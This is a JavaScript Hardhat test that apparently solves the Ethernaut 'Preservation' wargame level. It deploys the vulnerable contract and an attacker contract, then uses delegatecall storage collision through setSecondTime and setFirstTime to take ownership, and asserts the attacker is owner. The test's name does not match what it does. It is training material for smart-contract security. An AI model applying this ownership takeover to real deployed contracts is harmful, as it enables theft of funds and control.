const {expect} = require("chai");
const {loadFixture} = require("ethereum-waffle");
const {ethers} = require("hardhat");
const {getContractAt} = require("@nomiclabs/hardhat-ethers/internal/helpers");
const hre = require("hardhat");

describe("BreakEven", function () {
    let deployer, user1, user2;

    it("Finds roots correctly", async function () {
        [deployer, user1, user2] = await ethers.getSigners();

        let BaseLibContract = await ethers.getContractFactory("LibraryContract");
        let timeZone1Library = await BaseLibContract.connect(deployer).deploy();
        let timeZone2Library = await BaseLibContract.connect(deployer).deploy();
        await timeZone1Library.deployed();
        await timeZone2Library.deployed();

        const basePreservation = await ethers.getContractFactory("Preservation");
        let preservationContract = await basePreservation.connect(deployer).deploy(timeZone1Library.address, timeZone2Library.address);
        await preservationContract.deployed()

        const attackBaseContract = await ethers.getContractFactory("AttackPreservation");
        let attackContract = await attackBaseContract.connect(user1).deploy();
        await attackContract.deployed()

        const tnx1 = await preservationContract.setSecondTime(attackContract.address)
        await tnx1.wait();
        const tnx2 = await preservationContract.setFirstTime(user1.address)

        await tnx2.wait();

        expect(
            await preservationContract.owner()
        ).to.be.equal(user1.address);

    });

    async function deployFixture() {
        let BaseDelegate = await ethers.getContractFactory("Delegate");
        let delegateContract = await BaseDelegate.connect(deployer).deploy(deployer.address);
        await delegateContract.deployed();

        const BaseDelegation = await ethers.getContractFactory("Delegation");
        let delegationContract = await BaseDelegation.connect(deployer).deploy(delegateContract.address);
        await delegationContract.deployed()

        return [delegationContract, BaseDelegate]
    }
});
